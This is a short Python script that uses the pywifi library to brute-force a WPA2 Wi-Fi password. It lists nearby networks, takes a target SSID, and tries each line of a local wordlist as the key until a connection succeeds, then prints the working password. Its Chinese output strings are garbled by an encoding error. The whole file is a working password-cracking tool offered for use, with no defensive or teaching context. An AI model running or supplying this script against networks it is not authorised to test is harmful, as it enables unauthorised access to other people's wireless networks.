import pywifi,time,threading,random,sys
from pywifi import const
from time import sleep
# wifiname = 'Tenda_388CC8'
path = r"D:\\HHY\Documents\����\wifi���������뱾 .txt"
def wificonnect(findStr):
    wifi = pywifi.PyWiFi()
    ifaces = wifi.interfaces()[0]
    ifaces.disconnect()
    wifistatus = ifaces.status()
    while (wifistatus == const.IFACE_DISCONNECTED) or (wifistatus == const.IFACE_INACTIVE):
        profile =pywifi.Profile()
        profile.ssid = wifiname
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = findStr
        ifaces.remove_all_network_profiles()
        tep_profile = ifaces.add_network_profile(profile)
        ifaces.connect(tep_profile)
        sleep(2)
        if ifaces.status() == const.IFACE_CONNECTED:
            return True
        else:
            return False
def run():
    while True:
        try:
            passStr = file.readline()
            if not  passStr:
                break
            bool1 = wificonnect(passStr)
            if bool1:
                print("��ȷ����:%s"%(passStr))
                file.close()
                break
            else:
                print("��������:%s"%(passStr))
        except:
            print("cuowu")

class main():
    global wifiname,file,lock
    wifi = pywifi.PyWiFi()
    ifaces = wifi.interfaces()[0]
    for name in ifaces.scan_results():
        print("��������wifi:"+name.ssid)
    wifiname = input("����wifi��\n")
    print("��ʼ�ƽ�:")
    file = open(path,"r",errors="ignore")
    run()
    sys.exit()


